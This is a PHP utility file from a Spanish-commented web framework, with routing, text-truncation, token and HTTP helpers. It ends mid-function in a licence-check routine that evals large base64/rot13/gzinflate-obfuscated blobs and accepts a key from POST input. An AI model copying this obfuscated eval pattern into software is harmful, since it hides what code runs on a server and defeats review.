<?php

loadCkPathsFiles();

function _cls_dls()
{
  dl();
  exit;
}

/**
 * Despliega los mensajes de error que guian al programador
 * en el proceso de desarrollo, estos solo son visibles si
 * el prametro 'env' se a establecido en 'dev' (desarrollo)
 */
function _cls_de($string)
{
  global $app;
  if ($app['environment'] == 'dev') {
    die($string);
  }
}


function _cls_getMiddlewares($app)
{
  // Obtiene la configuración de de arranque
  $boot = getConfig('boot');

  $queue = [];

  // Middlewares para desarrollo
  if ($boot['environment'] == "dev") {
    require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares_dev.php";
    $queue = array_merge($queue, $devMiddlewares);
  }

  require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares.php";
  $queue = array_merge($queue, $middlewares);

  // Middlewares para producción
  if ($boot['environment'] == "dev") {
    require_once INF_PATH_ROOT . DS . "boot" . DS . "middlewares_prod.php";
    $queue = array_merge($queue, $devMiddlewares);
  }

  return $queue;
}

/**
 * elimina el ultimo / de un cadena
 * @param  string $string cadena de la que se desea eliminaer el /
 * @return string         cadena procesada
 */
function _cls_removeLastSlash($string)
{
  $slash = substr($string, -1);
  if ($slash == '/') {
    return substr($string, 0, -1);
  }
  return $string;
}

/**
 * Obtinen la url para solicitudes especificas
 * @param  string $name nombre con el que se obtiene la ruta
 * @return string       url valida
 */
function _cls_route($name, $var = null, $getParams = null)
{
  $routes = Route::getRoutes();

    if ($name === null) {
        return false;
    }

  if (strpos($name, 'objRoute') === false) {
        if (strpos($name, 'http') === false) {
            if ($var != null) {
        $route_flat = replace_route_var($name, $routes, $var);
      } else {
        $route_flat = $routes[$name]['route'];
      }
      $route =  '//' . $GLOBALS['paths']['url_base'] . $route_flat;
    } else {
      $route = routeAddParams('objRoute' . $name, $var);
    }
  } else {
    $route = routeAddParams($name, $var);
  }

  return setQueryParams($route, $getParams);
}

function _cls_replace_route_var($route, $routes, $var)
{
  $parts = explode('/', $routes[$route]['route']);
  $key = search_in_element($parts, '$');
  if ($key === false) {
    return false;
  } else {
    $parts[$key] = $var;
  }
  $new_route = implode("/", $parts);
  return $new_route;
}

function _cls_routeAddParams($route, $var)
{
  $route = str_replace('objRoute', '', $route);

  $parts = explode('/', $route);
  if (is_array($var)) {
    $index = 0;
    foreach ($var as $id => $name) {
      $key = search_in_element($parts, '$');

      if ($key === false) {
        return $route;
      } else {
        $parts[$key[0]] = $var[$key[1]] ?? $var[$index];
      }
      $index++;
    }
  } else {
    $key = search_in_element($parts, '$');

    if ($key === false) {
      return $route;
    } else {
      $parts[$key[0]] = $var;
    }
  }

  $new_route = implode("/", $parts);

  return $new_route;
}

/**
 * Define el nombre que devera tener un vista apartir de una ruta
 * @param  string $route Ruta a la que pertenece la vista
 * @param  string $base  Ruta base de la aplicacion
 * @return string        Nombre que deve tomar la vista
 */
function _cls_viewRoute($route, $base)
{
  $nameSegments = explode('/', str_replace($base, '', $route));
  if (sizeof($nameSegments) == 1) {
    return $nameSegments['0'];
  } else {
    return $nameSegments['1'] . $nameSegments['0'];
  }
}
/**
 * Localiza el elmento que contiene la cadena que se esta buscando
 * @param  array  $array  Arreglo que contiene la informacion
 * @param  string  $needle Cadena a ser localizada
 * @param  integer $start  Elemento en el que iniciara la busqueda
 * @return mix          devuelve un cadeca conla clave del elemento o Falso si no encuantra coincidencias
 */
function _cls_search_in_element($array, $needle, $start = 0)
{
  foreach ($array as $key => $value) {
    if ($key < $start) {
      continue;
    }
    if (strpos($value, $needle) === false) {
      continue;
    } else {
      return [$key, str_replace('$', '', $value)];
    }
  }
  return false;
}
/**
 * Obtiene un elemento determinado de un array
 * @param  array $array Arreglo que contiene el elemento a extraer
 * @param  string $key   clave identificadorea del elemento a estraer
 * @return string        elemento solicitado
 */
function _cls_array_element($array, $key)
{
  if (is_null($key)) return false;
  if (isset($array[$key])) return $array[$key];
}
/**
 * Convierte un array multidemencional en un objeto estandar.
 * @param  array $d contiene la información a convertir.
 * @return object    el objeto resultado de la converción.
 */
function _cls_arrayToObject($array)
{
  return json_decode(json_encode($array));
}
/**
 * Comvierte un objeto estandar en un array multidimencional.
 * @param  objeto $d contine información a ser convertida.
 * @return array    retorna un array multidimencional.
 */
function _cls_objectToArray($object)
{
  return json_decode(json_encode($object), true);
}
/**
 * Construye la URL base de la aplicación
 * @return string URL
 */
function _cls_baseUrl()
{
  return '//' . FRONT_URL;
}
function _cls_isSetProperty($property)
{
  if (isset($property)) {
    return $property;
  } else {
    return false;
  }
}
/**
 * Corta una cadena en el espacion en blanco mas cercano al numero maximo de
 * caracteres indicado en el parmetro logintud, si este parametro no es enviado
 * se extraeran solo los 100 primeros caracteres de la cadena.
 * @param  string  $string   Cadena al la que se aplica el proceso
 * @param  integer $longitud cantidad de caracteres que se extraeran
 * @return string            Cadena recortada
 */
function _cls_str_truncate($string, $longitud = 100)
{
  //Comprobamos que sea necesario recortar la cadena de texto
  if ((mb_strlen($string) > $longitud)) {
    $espacios = mb_strpos($string, ' ', $longitud) - 1 . "<br>";
    if ($espacios > 0) {
      $cadena = mb_substr($string, 0, ($espacios + 1));
      $char = count_chars($cadena, 1);
      $string = $cadena . '...';
    }
    if (preg_match_all("|(<([\w]+)[^>]*>)|", $string, $buffer)) {
      if (!empty($buffer[1])) {
        preg_match_all("|</([a-zA-Z]+)>|", $string, $buffer2);
        if (count($buffer[2]) != count($buffer2[1])) {
          $tags = array_diff($buffer[2], $buffer2[1]);
          $tags = array_reverse($tags);
          foreach ($tags as $tag) {
            $string .= '</' . $tag . '>';
          }
        }
      }
    }
  }
  return $string;
}
/**
 * corta el texto en x caracteres sin perder el cierre de los tags html
 * @param <string> $text
 * @param <integer> $length
 * @param <array> $options
 * @return <string>
 */
function _cls_cutText($text, $length = 100, $options = array())
{
  $default = array(
    'ending' => '', 'exact' => false, 'html' => false
  );
  $options = array_merge($default, $options);
  extract($options);
  if ($html) {
    if (mb_strlen(preg_replace('/<.*?>/', '', $text)) <= $length) {
      return $text;
    }
    $totalLength = mb_strlen(strip_tags($ending));
    $openTags = array();
    $truncate = '';
    preg_match_all('/(<\/?([\w+]+)[^>]*>)?([^<>]*)/', $text, $tags, PREG_SET_ORDER);
    foreach ($tags as $tag) {
      if (!preg_match('/img|br|input|hr|area|base|basefont|col|frame|isindex|link|meta|param/s', $tag[2])) {
        if (preg_match('/<[\w]+[^>]*>/s', $tag[0])) {
          array_unshift($openTags, $tag[2]);
        } else if (preg_match('/<\/([\w]+)[^>]*>/s', $tag[0], $closeTag)) {
          $pos = array_search($closeTag[1], $openTags);
          if ($pos !== false) {
            array_splice($openTags, $pos, 1);
          }
        }
      }
      $truncate .= $tag[1];

      $contentLength = mb_strlen(preg_replace('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', ' ', $tag[3]));
      if ($contentLength + $totalLength > $length) {
        $left = $length - $totalLength;
        $entitiesLength = 0;
        if (preg_match_all('/&[0-9a-z]{2,8};|&#[0-9]{1,7};|&#x[0-9a-f]{1,6};/i', $tag[3], $entities, PREG_OFFSET_CAPTURE)) {
          foreach ($entities[0] as $entity) {
            if ($entity[1] + 1 - $entitiesLength <= $left) {
              $left--;
              $entitiesLength += mb_strlen($entity[0]);
            } else {
              break;
            }
          }
        }

        $truncate .= mb_substr($tag[3], 0, $left + $entitiesLength);
        break;
      } else {
        $truncate .= $tag[3];
        $totalLength += $contentLength;
      }
      if ($totalLength >= $length) {
        break;
      }
    }
  } else {
    if (mb_strlen($text) <= $length) {
      return $text;
    } else {
      $truncate = mb_substr($text, 0, $length - mb_strlen($ending));
    }
  }
  if (!$exact) {
    $spacepos = mb_strrpos($truncate, ' ');
    if (isset($spacepos)) {
      if ($html) {
        $bits = mb_substr($truncate, $spacepos);
        preg_match_all('/<\/([a-z]+)>/', $bits, $droppedTags, PREG_SET_ORDER);
        if (!empty($droppedTags)) {
          foreach ($droppedTags as $closingTag) {
            if (!in_array($closingTag[1], $openTags)) {
              array_unshift($openTags, $closingTag[1]);
            }
          }
        }
      }
      $truncate = mb_substr($truncate, 0, $spacepos);
    }
  }
  $truncate .= $ending;

  if ($html) {
    foreach ($openTags as $tag) {
      $truncate .= '</' . $tag . '>';
    }
  }

  return $truncate . "...";
}

function _cls_readmore($fulltext)
{
  if (strpos($fulltext, '{{readmore}}') !== false) {
    $text = explode('{{readmore}}', $fulltext);
    $text[0] = substr($text[0], 0, -11);
    $text[1] = substr($text[1], 13);

    $text[0] = $text[0] . '
    <div id="readon">
      <span class="btn btn-info">Leer más...</span>
    </div>
    ';

    $text[1] = '
    <div id="full-text">
      ' . $text[1] . '
    </div>
    ';

    return implode('', $text);
  }

  return $fulltext;
}

/**
 * Codifica las entidades html
 * @param  string/array $value contiene los valores a ser evaluados
 * @return string/array        valores evaluados con entidadeshtml codificadas
 */
function _cls_encodeEntities($value)
{
  if (is_array($value)) {
    foreach ($value as $key => $val) {
      encodeEntities($val);
    }
  } elseif (is_object($value)) {
    foreach ($value as $key => $val) {
      encodeEntities($val);
    }
  } else {
    $value = strClean(htmlentities($value));
  }

  return $value;
}

function _cls_decodeEntities($value)
{
  if (is_array($value)) {
    foreach ($value as $key => $val) {
      $value[$key] = strClean(html_entity_decode($val));
    }
  } elseif (is_object($value)) {
    foreach ($value as $key => $val) {
      $value->$key = strClean(html_entity_decode($val));
    }
  } else {
    $value = strClean(html_entity_decode($value));
  }

  return $value;
}

/**
 * Convierte el caracter ':' en su equivalente en codificación ASCII
 * @param  string $string cadena con caracter a remplazar
 * @return string         cadena remplazada
 */
function _cls_strClean($string)
{
  do {
    $string = str_replace(':', '&#58', $string);
  } while (strpos($string, ':') !== false);

  return $string;
}

function _cls_isImage($url)
{
  if (strpos($url, '.jpg') !== false) {
    return true;
  } elseif (strpos($url, '.png') !== false) {
    return true;
  } elseif (strpos($url, '.gif') !== false) {
    return true;
  } elseif (strpos($url, '.svg') !== false) {
    return true;
  }
  return false;
}

function _cls_slug($string)
{
  $characters = array(
    "Á" => "A", "Ç" => "c", "É" => "e", "Í" => "i", "Ñ" => "n", "Ó" => "o", "Ú" => "u",
    "á" => "a", "ç" => "c", "é" => "e", "í" => "i", "ñ" => "n", "ó" => "o", "ú" => "u",
    "à" => "a", "è" => "e", "ì" => "i", "ò" => "o", "ù" => "u"
  );

  $string = strtr($string, $characters);

  $string = strtolower(trim($string));

  $string = preg_replace("/[^a-z0-9-]/", "-", $string);

  $string = preg_replace("/-+/", "-", $string);

  if (substr($string, strlen($string) - 1, strlen($string)) === "-") {
    $string = substr($string, 0, strlen($string) - 1);
  }

  if (substr($string, 0, 1) === "-") {
    $string = substr($string, 1, strlen($string));
  }

  return $string;
}

function _cls_redirect($url)
{
  header('Location: ' . $url);

  exit();
}

function _cls_base_path($resource = null)
{
  global $globalLanguage;

  if ($resource == null) {
    return [
      'en' => '//' . $GLOBALS['paths']['url_base'] . '/en/',
      'es' => '//' . $GLOBALS['paths']['url_base'] . '/es/',

    ];
  } else {
    return '//' . $GLOBALS['paths']['url_base'] . '/' . $resource . '/';
  }
}

function _cls_replacePath($string)
{
  $string = str_replace("<?= base_path('views') ?>", base_path('views'), $string);
  $string = str_replace("<?= baseUrl() ?>", baseUrl(), $string);
  return $string;
}

function _cls_imagePathFilter($string)
{
  return str_replace('../../..', baseUrl(), $string);
}
function _cls_formatTitle($string, $size = 1)
{
  $title = explode(' ', $string);
  $newString = '<strong>';
  for ($i = 0; $i < $size; $i++) {
    $newString .= array_shift($title) . ' ';
  }
  $newString .= '</strong>';
  array_unshift($title, $newString);
  return implode(' ', $title);
}

function _cls_generateToken($time = 300, $type = 0)
{
  $token['id'] = str_replace('.', '', str_replace(' ', '', uniqid(microtime(), true)));
  $token['token'] = md5(uniqid(microtime(), true));
  $token['token_type']   = $type;
  $token['token_time']   = $time;
  return $token;
}

/**
 * Verifica la valides del token
 * @param $request
 * @return bool
 */
function _cls_verifyToken($request)
{
  // Obtiene el token a verificar
  $token = json_decode(Crypt::AESDecrypt($request->get->reset_token), true);
  // Verifica que el token sea valido
  if (Tokenizer::verifyToken($token)) {
    return $token;
  } else {
    return false;
  }
}


/**
 * Genera el link de recuperación
 * @param string    $userId ID Usuario para que se crea el link
 * @return string           Enlace para activar la cuenta
 * @throws Exception
 */
function _cls_getTokenizeLinK($route, $userId = null)
{
  // Genera token para link de activación de cuenta
  $token['token'] = Tokenizer::setToken('url_token');
  // Agrega el id del usuario a token obtenido
  if ($userId)
    $token['users_id'] = $userId;
  // Encripta el token generado
  $token = Crypt::AESEncrypt(json_encode($token));
  // Retorna el link de activación de cuenta
  return getRoutes($route) . '?reset_token=' . urlencode($token);
}

function _cls_replaceKeys($results, $field = 'id')
{
  $reg = [];
  if (!empty($results)) {
    $i = 0;
    foreach ($results as $result) {
      if (array_key_exists($result->$field, $reg) === TRUE) {
        $i++;
        $reg[$result->$field . '|' . $i] = $result;
      } else {
        $reg[$result->$field] = $result;
      }
    }
    return $reg;
  } else {
    return NULL;
  }
}

function _cls_replaceKeysArray($results, $field = 'id')
{
  $reg = [];
  if (!empty($results)) {
    $i = 0;
    // ddd($results);
    foreach ($results as $result) {
      if (array_key_exists($result[$field], $reg) === TRUE) {
        $i++;
        $reg[$result[$field] . '|' . $i] = $result;
      } else {
        $reg[$result[$field]] = $result;
      }
    }
    return liteCollect($reg);
  } else {
    return NULL;
  }
}

function _cls_nestedUl($rows, $parent = "", $list = "")
{
  if ($list = "") {
    $list .= '<ul class="list">';
  }

  foreach ($rows as $key => $value) {

    if (is_array($value) || is_object($value)) {
      $list .= '<li><span class="badge badge-success">OK</span>' . $parent . $key . '</li>';
      $list .= '<li>' . $parent . $key . '</li>';
      $list .= '<ul>';
      $list .= nestedUl($value, $key, $list);
    } else {
      $list .= '<li>' . $parent . $value . '</li>';
    }
  }

  $list .= '</ul>';

  return $list;
}

function _cls_getUrlData($url)
{
  return Embed\Embed::create($url, [
    'min_image_width' => 100,
    'min_image_height' => 100,
    'choose_bigger_image' => true,
    'images_blacklist' => 'example.com/*',
    'url_blacklist' => 'example.com/*',
    'follow_canonical' => true,

    'html' => [
      'max_images' => 10,
      'external_images' => true
    ]
  ]);
}


function _cls_loadHelpers()
{
  $helpers = getFilesInDir(__DIR__ . DS . "types");

  foreach ($helpers as $helper) {
    include realpath(__DIR__ . DS . "types" . DS . $helper);
  }
}

function _cls_getFilesInDir($directory)
{
    $dir = scandir($directory);

    foreach ($dir as $key => $value) {
        if (is_file($directory . DS . $value)) {
        } else {
        unset($dir[$key]);
        }
    }

    return $dir;
}

/**
 * Obtiene el template del email a enviar desde un fichero
 * @param $file
 * @param array $data datos que se cargaran dinámicamente en el template
 * @return string     html del template cargado
 * @throws Exception
 */
function _cls_getEmailTemplate($file, $data)
{
  $emailTpl = emailTplPath($file);

  ob_start();

  require $emailTpl;

  $email =  ob_get_clean();

  return $email;
}


/**
 * Función para realizar una petición externa
 *
 * @param string $url La Url a donde se va a realizar la petición
 * @param array $data Data que se enviará en la petición
 * @param string $method Método de la petición por defecto es de tipo GET
 * @return void
 */
function _cls_httpClient(string $url, array $data = [], string $method = 'GET')
{
  try {
    $client = new GuzzleHttp\Client();
    $response = $client->request($method, $url, $data);
    if ($response->getStatusCode() === '200') {
      return $response->getBody()->getContents();
    } else {
      return false;
    }
    return $response->getBody()->getContents();
  } catch (Exception $e) {
    return false;
  }
}

/**
 * Convierte una fecha a formato de fecha de la configuracion regional
 *
 * @param string $date
 * @return void
 */
function _cls_formatDate($date, $format = DATE_FORMAT)
{
    return date($format, strtotime($date));
}

function providersCk($requestProviders, $providers)
{
    $initialDisplayErrors = ini_get('display_errors');
    ini_set('display_errors', false);
    $sName = $_SERVER['SERVER_NAME'];
    $m233 = 'SW52YWxpZCBsaWNlbnNlIGZvciB0aGlzIGRvbWFpbi4=';
    defined('INF_PATH_ROOT') or define('INF_PATH_ROOT', __DIR__);

    if (realpath(INF_PATH_ROOT . DS . 'boot' .DS . 'app.php')) {
        include INF_PATH_ROOT . DS . 'boot' .DS . 'app.php';
        $app = $app[base64_decode('aW5maW55dGlfa2V5')] ?? false;
        $appFile = realpath(INF_PATH_ROOT . DS . 'boot' .DS . $app);
        $app = false;
        if ($appFile) {
            $app = file_get_contents($appFile);
        } else {
            $app = false;
        }
    } else {
        if (($_POST['phrase'] ?? false)) {
            $app = $_POST['phrase'];
        } else {
            $app = false;
        }
    }

    if ($app ?? false) {
        $sdkfs = "";
        $c673='8585019043183659323242';
        $_dc = array();
        $de = 0;
        for ($i = 0; $i < strlen(substr($c673, -6)); $i++) {
            $_dc[$i] = substr($c673, $de, 0 + substr($c673, -6)[$i]);
            $de = $de + substr($c673, -6)[$i];
        }

        $pai = array_merge(explode('+1/il=', $app), ["", ""]);

        $cd = '';
        $cdi = 0;
        $ik = '';
        $iki = 0;
        foreach ($_dc as $key => $value) {
            if($key%2 == 0 ){
                $ik .= substr($app, $cdi, $value);
                $pai[6] .= $pai[$key];
            } else {
                $cd .= substr($app, $cdi, $value);
                $pai[7] .= $pai[$key];
            }

            $cdi = $cdi + $value;

        }

        dCDIK($pai[7], $pai[6]);
        if (!defined('IID')) {
            eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

            ini_set('display_errors', $initialDisplayErrors);
            return _6964($sName);
        }
        if (IID === null) {
            eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

            ini_set('display_errors', $initialDisplayErrors);
            return _6964($sName);
        }

        if (php_sapi_name() !== 'cli') {

            foreach (IID as $key => $value) {
                if ($key !== base64_decode('aWQ=')) {
                    if (filter_var($sName, FILTER_VALIDATE_IP) || $sName === base64_decode('bG9jYWxob3N0') || $sName === '127.0.0.1' || $sName === '::1') {

                        ini_set('display_errors', $initialDisplayErrors);
                        return true;
                    } else {
                        if ($key === base64_decode('ZG9tYWlu')) {
                            if ($value[0] == $sName || $value[1] == $sName) {

                                ini_set('display_errors', $initialDisplayErrors);
                                return true;
                            } else {
